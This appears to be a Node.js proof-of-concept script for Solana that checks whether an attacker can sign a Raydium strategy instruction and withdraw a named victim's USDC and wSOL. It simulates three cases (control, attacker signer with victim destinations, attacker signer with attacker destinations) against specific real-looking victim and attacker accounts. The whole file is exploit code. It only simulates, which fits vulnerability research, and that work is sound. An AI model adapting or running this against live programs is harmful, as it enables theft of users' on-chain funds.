const { conn, simulate, ix, PublicKey } = require("./lib.js");
const { Market } = require("@project-serum/serum");
const fs = require("fs");
const ANA = __dirname;
const RAY_PROG = "2nAAsYdXF3eTQzaeUQS3fr4o782dDg8L28mX39Wr5j8N";
const TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
const AMM_AUTHORITY = "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1";
const sleep = ms => new Promise(r => setTimeout(r, ms));

const S = JSON.parse(fs.readFileSync(`${ANA}/strategies.json`, "utf8")).raydium.find(s => s.strategy === "34eXEXypQiwyQhMRAMbCEJSs16SVaN3C6wzPicEcBTH1");

const VICTIM = { owner: "3CBKizNkCJ6tUNmoe3fi3WdbqxJExrQDRDyGJNUhY48T", userInfo: "5GKggYWTsERBaSx3yTbUay4KmJ24Kpbe91HS6D95fuS", usdc: "6MZVh4nk6evXVTpsRh8BpGHaihN88YKqcZ4dGRFbKYBb", wsol: "5x5juNdvTWaaKk2FpgZaMa5iuvjjSnXkniKsFPtVN2S" };
const ATTACKER = { owner: "6joanWsSEJtQrUXeFg6vHBdJfqh2JQyYw776tgGvPp2o", usdc: "HLGrJ9dT34vmkszRw3HKcBUCJSwWL2MGW9Baw99jCyhs", wsol: "H1mzRoGjxv67Rb2EoYxuCSsKLMYA5FmehsLzWsUQ9Vwy" };

function pk(buf, off) { return new PublicKey(buf.slice(off, off + 32)).toBase58(); }

(async () => {
  const amm = (await conn.getAccountInfo(new PublicKey(S.ammId))).data;
  const baseVault = pk(amm, 336), quoteVault = pk(amm, 368), openOrders = pk(amm, 496);
  const marketId = pk(amm, 528), targetOrders = pk(amm, 592), serumProg = pk(amm, 560);
  await sleep(700);
  const market = await Market.load(conn, new PublicKey(marketId), { commitment: "confirmed" }, new PublicKey(serumProg));
  const nonceBuf = Buffer.alloc(8); nonceBuf.writeBigUInt64LE(BigInt(market.decoded.vaultSignerNonce.toString()));
  const vaultSigner = await PublicKey.createProgramAddress([new PublicKey(marketId).toBuffer(), nonceBuf], new PublicKey(serumProg));
  const eventQueue = new PublicKey(market.decoded.eventQueue).toBase58();
  const serumBase = new PublicKey(market.decoded.baseVault).toBase58();
  const serumQuote = new PublicKey(market.decoded.quoteVault).toBase58();

  const meta = (p, s, w) => ({ pubkey: p, signer: !!s, writable: !!w });
  function build(signer, t0, t1) {
    return [
      meta(signer, true, true), meta(VICTIM.userInfo, false, true), meta(t0, false, true), meta(t1, false, true),
      meta(S.strategy, false, true), meta(S.authority, false, true), meta(S.tknAccount0, false, true), meta(S.tknAccount1, false, true),
      meta(S.lpAccount, false, true), meta(TOKEN, false, false), meta(S.ammProgramId, false, false), meta(S.ammId, false, true),
      meta(AMM_AUTHORITY, false, true), meta(openOrders, false, true), meta(targetOrders, false, true),
      meta(baseVault, false, true), meta(quoteVault, false, true), meta(serumProg, false, false), meta(marketId, false, true),
      meta(market.bidsAddress.toBase58(), false, true), meta(market.asksAddress.toBase58(), false, true), meta(eventQueue, false, true),
      meta(serumBase, false, true), meta(serumQuote, false, true), meta(vaultSigner.toBase58(), false, true),
    ];
  }
  const watch = [S.strategy, S.tknAccount0, S.tknAccount1, VICTIM.usdc, VICTIM.wsol, ATTACKER.usdc, ATTACKER.wsol];
  const data = Buffer.from("6f607d39534edca000", "hex");

  await simulate([ix(RAY_PROG, data, build(VICTIM.owner, VICTIM.usdc, VICTIM.wsol))], watch, "CONTROL: victim signer + victim destinations");
  await sleep(1200);
  await simulate([ix(RAY_PROG, data, build(ATTACKER.owner, VICTIM.usdc, VICTIM.wsol))], watch, "ATTACK-A: attacker signer + victim destinations");
  await sleep(1200);
  await simulate([ix(RAY_PROG, data, build(ATTACKER.owner, ATTACKER.usdc, ATTACKER.wsol))], watch, "ATTACK-B: attacker signer + attacker destinations");
})().catch(e => { console.error("FATAL", e); process.exit(1); });
